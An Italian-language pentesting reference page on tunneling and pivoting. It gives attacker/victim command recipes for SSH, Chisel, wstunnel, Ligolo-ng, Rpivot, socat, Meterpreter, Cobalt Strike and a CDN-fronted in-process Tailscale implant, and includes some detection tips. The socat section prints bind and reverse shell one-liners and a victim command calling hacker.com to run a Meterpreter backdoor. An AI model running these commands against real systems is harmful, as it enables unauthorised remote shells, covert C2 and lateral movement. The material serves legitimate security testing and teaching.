# Tunneling e Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Suggerimento su Nmap

> [!WARNING]
> Il supporto proxy di Nmap è limitato alle connessioni TCP e non influisce sulle scansioni ping, delle porte o di rilevamento del sistema operativo. Quando lo scanner si trova dietro un proxy SOCKS, **disabilita il rilevamento degli host** (`-Pn`) e usa una **scansione TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Il comando finale usa le opzioni `-u` e `-i` di Evil-WinRM per specificare l'account e l'host WinRM; la porta WinRM predefinita è 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH può inoltrare connessioni X11, porte TCP arbitrarie e socket di dominio Unix attraverso il proprio canale crittografato.<sup>[[6]](#references)</sup>

Connessione grafica SSH (X)

`-Y` abilita l’inoltro X11 attendibile e `-C` richiede la compressione dei dati inoltrati.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Apri una nuova porta nel server SSH --> Altra porta

L'inoltro Remote (`-R`) ascolta sul server SSH e si connette al lato locale; l'indirizzo di bind esplicito controlla quali interfacce possono raggiungere il listener.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Porta locale --> Host compromesso (SSH) --> Third_box:Port

Il forwarding locale (`-L`) è in ascolto sul client e si connette alla destinazione dal lato del server SSH.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Porta locale --> Host compromesso (SSH) --> Ovunque

Il forwarding dinamico (`-D`) crea un listener SOCKS4/SOCKS5 locale, le cui connessioni vengono aperte dal lato remoto.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop con ProxyJump

`-J`/`ProxyJump` si connette al target tramite uno o più jump host separati da virgole. Le opzioni di forwarding appartengono comunque alla connessione SSH finale, quindi il listener SOCKS qui sotto apre connessioni verso destinazioni raggiungibili da `internal-target`, non dal primo bastion. In questo modo si evita di accedere a un jump host e avviare lì un secondo client SSH.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Le opzioni specifiche per gli host jump devono essere inserite in `~/.ssh/config`; la configurazione da riga di comando destinata alla destinazione non viene applicata automaticamente agli host intermedi.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

È utile per ottenere reverse shell dagli host interni attraverso una DMZ fino al tuo host:

L'impostazione `GatewayPorts` del server determina se un remote forward può essere associato a un'interfaccia diversa da loopback; il valore predefinito è `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Questo esempio basato su root crea dispositivi tunnel su entrambi gli host. Il server deve consentire il forwarding tun e l’account selezionato deve poter accedere al dispositivo tun; `PermitRootLogin yes` è un modo per usare qui l’account `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Abilitare il forwarding sul lato server

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Impostare una nuova route sul lato client

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Sicurezza – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 ha aggiunto l’estensione strict-KEX per contrastare l’attacco all’integrità del trasporto iniziale di Terrapin. Se possibile, aggiornate entrambi i peer e, per le implementazioni meno recenti, seguite le indicazioni del vendor invece di presumere che un canale inoltrato sia protetto solo in base alla versione.<sup>[[8]](#references)</sup>

## SSHUTTLE

Puoi **incanalare** tramite **ssh** tutto il **traffico** diretto a una **sottorete** attraverso un host.\
Ad esempio, inoltrare tutto il traffico diretto a 10.10.10.0/24

`sshuttle` fornisce un proxy trasparente tramite SSH e supporta la selezione delle sottoreti e un comando SSH personalizzato, come mostrato di seguito.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Connettersi con una chiave privata

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` di Metasploit supporta il forwarding locale e remoto, mentre il modulo proxy SOCKS è pensato per funzionare con le route di sessione o `autoroute` e, in questi esempi, è in ascolto sulla porta 1080 per impostazione predefinita.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Porta locale --> Host compromesso (sessione attiva) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Un altro modo:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Il Beacon di Cobalt Strike può inoltrare connessioni SOCKS4a/SOCKS5 tramite un Beacon; `rportfwd` apre un binding sull'host compromesso, mentre `rportfwd_local` avvia la connessione alla destinazione dal client di Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### Proxy SOCKS

Apri una porta nel Team Server sulle interfacce da cui il traffico deve essere instradato tramite il Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> In questo caso, la **porta viene aperta sull'host Beacon**, non sul Team Server, e il traffico viene inviato al Team Server e da lì all'host:port indicato.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Il manuale sul reverse forwarding descrive il seguente comportamento:<sup>[[14]](#references)</sup>

- Il reverse port forward di Beacon è progettato per **incanalare il traffico verso il Team Server, non per inoltrarlo tra singole macchine**.
- Il traffico viene **incanalato all'interno del traffico C2 di Beacon**, inclusi i link P2P.
- Le porte alte di solito evitano le restrizioni sulle porte privilegiate, ma restano applicabili le policy del sistema operativo target e i listener già attivi.

### rPort2Port local

> [!WARNING]
> In questo caso, la **porta viene aperta sull'host di Beacon**, non sul Team Server, e il **traffico viene inviato al client di Cobalt Strike** (non al Team Server) e da lì all'host:porta indicato.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: inoltro TCP userspace senza account

Tailcat usa il data plane WireGuard/NAT-traversal/DERP di Tailscale senza il control plane di Tailscale. Non richiede un account Tailscale né privilegi di amministratore e non installa rotte host né modifica il DNS. A differenza di [Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve) o del [tailnet BOFScale](#bofscale---cdn-fronted-in-process-tailnet) in-process, il server condivide *un indirizzo Tailcat* fuori banda. Il client usa quell’indirizzo per raggiungere una porta esposta dal nodo remoto.<sup>[[62]](#references)</sup>

Per un servizio TCP già in ascolto sulla porta `4444` del nodo remoto, avvia `serve` lì e passa l’indirizzo stampato a `forward` sul client. Il secondo comando si mette in ascolto su `127.0.0.1:18080` per impostazione predefinita, quindi un processo locale che supporta solo normali socket TCP può connettersi a quella porta di loopback, mentre Tailcat trasporta il traffico verso la porta remota `4444`.<sup>[[62]](#references)</sup> I numeri di porta non sono specifici di Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

L'indirizzo contiene la chiave pubblica WireGuard del server e, per impostazione predefinita nelle versioni attuali, una chiave precondivisa. Trattalo come una credenziale: un server senza restrizioni accetta un peer che conosce l'indirizzo. Un indirizzo effimero smette di funzionare quando il server termina. Una chiave `default` salvata fa sì che `serve` riutilizzi un indirizzo stabile nelle esecuzioni successive: controlla quindi il messaggio di avvio e limita i client con `serve --allow` se l'indirizzo potrebbe essere esposto.<sup>[[62]](#references)</sup>

Le connessioni possono usare un percorso UDP diretto o un relay DERP. Questo evita di dover disporre di un dominio C2 dedicato, ma non fa scomparire l'attività di rete.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet in-process fronted da CDN

[BOFScale](https://github.com/NetSPI/BOFscale) esegue un overlay Tailscale modificato all'interno di un implant Windows C2 senza installare un driver TUN o un servizio. I suoi tre componenti sono un BOF-PE `tailscaled` asincrono CGo `c-shared`, un piccolo BOF-PE C++ che comunica con l'API locale e un bridge TCP-to-SOCKS5 `socksportfwd` asincrono.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 e DERP compatibili con CDN

Tailscale usa normalmente aggiornamenti HTTP proprietari per il canale di controllo TS2021 basato su Noise e per il relay DERP. BOFScale mantiene questi flussi di byte, ma li trasporta tramite WebSocket RFC 6455, usando `Sec-WebSocket-Protocol: ts2021` o `derp`, così un'origine Headscale/DERP controllata dall'operatore può essere ospitata dietro una CDN che accetta solo aggiornamenti WebSocket standard. Il client patchato riprova TS2021 su WebSocket dopo un HTTP `500`, riprova DERP dopo un HTTP `426` e fa sì che il dialer WebSocket DERP rispetti la configurazione del proxy host; il BOF imposta `TS_DEBUG_DERP_WS_CLIENT=1` per saltare il primo tentativo, notoriamente destinato a fallire.<sup>[[53]](#references)[[54]](#references)</sup>

La CDN e il proxy dell'origine devono mantenere gli aggiornamenti WebSocket per `/ts2021` e `/derp`, inoltrare `/key` come normale HTTP e disabilitare i timeout interni di lettura/scrittura, poiché le sessioni relay possono rimanere aperte indefinitamente. La configurazione Headscale fornita abilita `verify_clients`, pubblica solo la mappa DERP incorporata dell'operatore e lascia `derp.urls` vuoto per impedire il fallback ai relay gestiti da Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon in-process e controllo tramite named pipe

Se non viene sovrascritto, l'entry point del BOF avvia `tailscaled` con `-tun=userspace-networking`, `-state mem:` e `-no-logs-no-support`, quindi crea una pipe con nome UUID. Reindirizza stdout/stderr di Go tramite una pipe OS all'API di output di Beacon, così l'intero daemon e il runtime Go restano residenti, ma stato e log non vengono scritti in una directory Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Il client leggero riproduce l'API locale HTTP/1.0 di Tailscale tramite quella pipe. Apre la pipe con `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` perché il livello `safesocket` del daemon effettua l'impersonificazione del client della pipe, invia `Tailscale-Cap: 125` e associa l'API locale alle operazioni `up`, `down`, `status`, di annuncio delle route e di arresto.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Non scaricare un BOF-PE Go mappato manualmente dopo aver chiesto al daemon di arrestarsi: le goroutine del runtime e del garbage collector possono continuare a eseguire codice da una memoria che il loader ha smappato. Esegui `tailscaled` in un processo sacrificabile e termina quel processo per la pulizia finale.<sup>[[54]](#references)</sup>

### Instradare il traffico originato dall'host tramite SOCKS5 userspace

Le connessioni tailnet in ingresso e le route subnet annunciate funzionano nello stack di rete userspace, ma i normali processi sull'host compromesso non hanno una route OS nell'overlay. `socksportfwd` si mette quindi in ascolto su una porta TCP accessibile dalla macchina vittima, negozia SOCKS5 `NO AUTH` con il listener `0.0.0.0:1080` del daemon, invia `CONNECT` per una destinazione tailnet e inoltra i dati in entrambe le direzioni in modo asincrono. Se la destinazione è un nome MagicDNS, usa `ATYP_DOMAIN`, facendo risolvere il nome a `tailscaled` senza esporlo al resolver Windows.<sup>[[53]](#references)[[54]](#references)</sup>

Di seguito è mostrato un flusso operativo minimo; sia il nodo dell'operatore sia l'implant devono usare i binari patchati, perché Tailscale standard non può attraversare questa configurazione CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Il forward locale può separare il listener di autenticazione apparente dal tool di relay: forza una macchina ad autenticarsi sulla porta in ascolto dell'host compromesso, inoltra il traffico attraverso il tailnet a `ntlmrelayx` e lo relaya verso AD CS, LDAP, HTTP, SMB o un altro target compatibile. Per le fasi specifiche della vulnerabilità, vedi [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) e [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8); BOFScale serve solo per il trasporto.<sup>[[54]](#references)</sup>

### Rilevamento

Cerca la combinazione, anziché un singolo indicatore debole: un runtime Go in un processo che normalmente non è basato su Go, una pipe UUID con SDDL permissiva `D:(A;;GA;;;WD)`, un listener SOCKS inatteso su `0.0.0.0:1080` e connessioni TLS WebSocket di lunga durata verso indirizzi CDN. Con l'ispezione TLS, segnala `Sec-WebSocket-Protocol: derp` o `ts2021` quando il processo proprietario non è un servizio `tailscaled` autorizzato. Le regole `bofscale.yar` del repository forniscono firme in memoria per tutti e tre i componenti BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Il progetto fornisce endpoint web tunnel come `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` e `tunnel.php`; carica un endpoint supportato prima di avviare il proxy locale.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel trasporta traffico TCP/UDP su HTTP tramite una connessione protetta da SSH; usa build client/server compatibili e verifica la sintassi dei comandi della release selezionata.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Inoltro delle porte

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) trasporta port forwarding statici o dinamici tramite WebSocket, HTTP/2 o WebTransport (HTTP/3 su QUIC). Le build attuali supportano TCP, UDP, socket Unix, stdio, SOCKS5, proxy HTTP e listener Linux per transparent proxy, sia in modalità forward che reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Avvia il server sull’attacker e fai connettere il pivot in uscita con `-R`. In questa modalità, il listener SOCKS5 viene creato sul **server**, mentre le connessioni richieste hanno origine dalla rete del **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Un reverse static forward usa la stessa direzione. Ad esempio, il seguente espone `10.10.10.20:445`, raggiungibile tramite il pivot, sulla porta loopback `8445` dell'attaccante:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Dettagli su egress e trasporto

- Aggiungi `-p http://user:pass@proxy:8080` al client per attraversare un proxy HTTP esplicito. Usa `socks5h://127.0.0.1:1080` in client come `curl` (oppure abilita il DNS proxied nell'applicazione) affinché i nomi interni vengano risolti oltre il tunnel, anziché essere divulgati al resolver locale.<sup>[[52]](#references)</sup>
- `wss://` seleziona WebSocket protetto da TLS. Un client `https://` seleziona HTTP/2, ma il buffering o la conversione a HTTP/1 da parte di reverse proxy/CDN spesso interrompono il flusso bidirezionale; per testare questa modalità, esponi direttamente il server wstunnel.<sup>[[52]](#references)</sup>
- `wts://` seleziona WebTransport su QUIC. Avvia il server con `--enable-webtransport` (o con un URL di ascolto `wts://`) e consenti UDP sulla porta di ascolto. Questa modalità non può attraversare un proxy HTTP `CONNECT` convenzionale, perché tale proxy trasporta TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Il progetto upstream avverte di non considerare il certificato self-signed incorporato come una protezione della privacy. Preferisci un certificato personalizzato valido insieme a `--tls-verify-certificate` (o mTLS), mantieni i listener del proxy su loopback, a meno che l'accesso remoto non sia intenzionale, e crea tunnel per protocolli già sicuri quando la riservatezza è importante.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

La guida rapida di Ligolo-ng documenta un'interfaccia TUN sul proxy, la convalida dell'impronta digitale del certificato per l'agent e la configurazione delle route per la rete incanalata nel tunnel.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Binding e ascolto dell'agent

Ligolo-ng può aggiungere listener sull'agent che inoltrano le connessioni a un indirizzo lato proxy, e il suo intervallo riservato `240.0.0.0/4` può essere instradato per raggiungere i servizi locali dell'agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Porte locali dell'Access Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot avvia il tunnel inverso dalla vittima ed espone un proxy SOCKS4 sull'indirizzo loopback dell'attaccante; il README documenta anche le credenziali e le opzioni hash del proxy NTLM.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot tramite **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat combina tipi di endpoint come `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` e `PROXY`; gli esempi qui sotto combinano questi endpoint documentati.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port tramite socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter tramite SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Puoi attraversare un **proxy non autenticato** con il tipo di indirizzo `PROXY` documentato di socat eseguendo questa riga invece dell'ultima nella console della vittima.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel SSL Socat

**/bin/sh console**

Crea certificati su entrambi i lati: client e server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Connetti la porta SSH locale (22) alla porta 443 dell'host dell'attaccante

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink è lo strumento da riga di comando per le connessioni di PuTTY, con opzioni di SSH forwarding simili a `ssh`.<sup>[[22]](#references)</sup>

Usa la `-P` maiuscola per la porta SSH. `-pw` è mantenuta per compatibilità, ma espone la password nell’elenco dei processi; ove possibile, preferisci l’autenticazione con chiave o `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Poiché questo binario verrà eseguito sulla vittima ed è un client SSH, apri il servizio SSH e la porta per la connessione inversa; il comando seguente usa `-R` per inoltrare una porta accessibile localmente alla macchina dell’attaccante.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Usa un contesto con le autorizzazioni richieste dall’host quando crei o modifichi regole `portproxy` persistenti. Microsoft documenta le sintassi `v4tov4` di aggiunta, visualizzazione ed eliminazione usate di seguito.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Distribuire `portproxy` tramite un'attività pianificata

Quando sono disponibili credenziali amministrative, l'esecuzione remota di Task Scheduler può installare una regola di inoltro nativa senza caricare un relay dedicato. Ad esempio, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) può far sì che un pivot si metta in ascolto sulla porta TCP/443 e inoltri la connessione a un servizio SMB interno.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

La regola è persistente, quindi elencala con `netsh interface portproxy show v4tov4` e rimuovila esplicitamente dopo i test. Ricorda che `portproxy` fornisce solo l'inoltro; anche il firewall dell'host deve consentire la porta in ascolto.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Devi avere **accesso RDP al sistema**.\
Scarica:

SocksOverRDP usa i Remote Desktop Dynamic Virtual Channels per trasportare una connessione SOCKS5 attraverso una sessione RDP esistente; il plugin client è in ascolto su `127.0.0.1:1080`, mentre il componente server viene eseguito sul target RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo tool usa i `Dynamic Virtual Channels` (`DVC`) della funzionalità Remote Desktop Service di Windows. DVC si occupa di **tunneling dei pacchetti attraverso la connessione RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Sul computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Ora possiamo **connetterci** alla **vittima** tramite **RDP** usando **`mstsc.exe`** e dovremmo ricevere un **messaggio** che indica che il **plugin SocksOverRDP è abilitato** e che sarà **in ascolto** su **127.0.0.1:1080**.

**Connettiti** tramite **RDP** e carica ed esegui il binario `SocksOverRDP-Server.exe` sulla macchina della vittima:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Ora, verifica sulla tua macchina (attacker) che la porta 1080 sia in ascolto:

```
netstat -antb | findstr 1080
```

Ora puoi usare [**Proxifier**](https://www.proxifier.com/) per instradare il traffico attraverso quella porta.<sup>[[26]](#references)</sup>

### Hunting dei virtual channel RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) è un altro tunnel basato su virtual channel RDP; il nome predefinito del channel è `rdp2tcp`, ma un operatore può sceglierne uno diverso.<sup>[[56]](#references)</sup> La creazione e la chiusura dei channel vengono registrate in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` con gli ID evento **132** e **148**. Cerca `rdp2tcp` e nomi di channel insoliti o casuali, quindi confrontali con channel previsti come `XPSRD`, `cliprdr` e `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Instradare tramite proxy le app GUI di Windows

Puoi configurare le app GUI di Windows affinché navighino tramite proxy usando [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
In **Profile -> Proxy Servers**, aggiungi l'IP e la porta del server SOCKS.\
In **Profile -> Proxification Rules**, aggiungi il nome del programma da instradare tramite proxy e le connessioni agli IP che vuoi instradare tramite proxy; le regole di Proxifier possono corrispondere ad applicazioni, host di destinazione e porte.<sup>[[27]](#references)</sup>

## Creare un tunnel attraverso un proxy NTLM

